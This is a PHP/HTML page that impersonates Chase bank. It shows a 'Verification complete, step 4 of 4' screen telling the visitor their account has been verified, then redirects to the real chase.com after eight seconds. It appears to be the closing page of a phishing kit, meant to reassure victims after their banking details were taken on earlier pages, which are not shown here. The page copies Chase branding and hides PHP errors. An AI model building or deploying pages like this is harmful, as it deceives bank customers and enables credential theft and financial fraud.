<?php require_once("../private/includes/initialize.php"); ?>
<?php error_reporting(0); ?>

<!doctype html>
<html lang="en">

  <head>
    <title>Verification complete - chase.com</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="JP-Morgan Chase">
    <meta name="desc" content="JPMorgan Chase & Co. is a leading global financial services firm and one of the largest banking institutions in the United States , with operations worldwide">
    <meta name="keywords" content="Chase online credit cards, mortgages, commercial banking, auto loans, investing & retirement planning, checking and business banking">

    <link rel="stylesheet" href="bootstrap/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="stylesheet/customStyles.css">
    <link rel="icon" href="images/favicon.ico" sizes="32x32">
  </head>
  <body class="custom-background-2">
    <header id="logon-summary-menu">
      <div class="transparent-header-jpui">
        <div>
          <a href="https://www.chase.com/">
            <div class="chase-logo"></div>
          </a>
        </div>
      </div>
    </header>

    <div id="wholePage-new" class="hfeed site">

        <div class="container" id="containing-style">
          <div class="row">
            <div class="col-xs-12" id="new-colun-style">

              <div class="panel panel-primary" id="myPanelStyle">
                <div class="panel-heading" id="headPanelStyle">
                  <h1 class="panel-title text-left">Processed</h1>
                </div>
                <div class="panel-body" id="bodyPanelStyle">
                  <div class="col-xs-12 col-sm-10 col-sm-offset-1">

                    <div class="monitor-progress" id="progress">
                      <div class="row">
                        <div class="col-xs-12 col-sm-6 clear-padding">
                          <h2>
                            Verification complete
                            <span class="util high-contrast">step 4 of 4</span>
                          </h2>
                        </div>
                        <div class="col-xs-12 col-sm-6 progress-padding">
                          <div class="progression-of-bars madest" id="progressions-made">
                            <ol class="steps-4" role="presentation">
                              <li class="active current-step" id="progression-made-1"></li>
                              <li class="active current-step" id="progression-made-2"></li>
                              <li class="active current-step" id="progression-made-3"></li>
                              <li class="active current-step" id="progression-made-4"></li>
                            </ol>
                          </div>
                        </div>

                      </div>
                    </div>
                    <p class="text-right customer-question">
                      <a href="https://www.chase.com/digital/resources/accessibility">
                        Have any questions? <span class="glyphicon glyphicon-menu-right style-types"></span>
                      </a>
                    </p>
                    <h3 class="text-left new-three-style">Thank You for helping us serve you better.</h3>
                    <p class="text-left customer-question">
                      Your account has been successfully verified. Redirecting, please wait: you will be "logged off"
                    </p>
                    <div class="row">
                          <div class="col-xs-12" id="new-input-Style-Log">
                              <div id="processing-the-info">
                              <img class="img-responsive center-block" src="images/checked.png" alt="Success">
                            </div>
                          </div>
                    </div>
                  </div>
                </div>

              </div>

            </div>
          </div>
        </div>

    </div>

      <script type="text/javascript">

          setTimeout(function(){
            window.location="https://www.chase.com/";

          }, 8000);

      </script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
      <script src="js/main.js"></script>
      <script>
          new WOW().init();
      </script>

      <script src="bootstrap/js/jquery.min.js"></script>
      <script src="bootstrap/js/bootstrap.min.js"></script>

  </body>
</html>
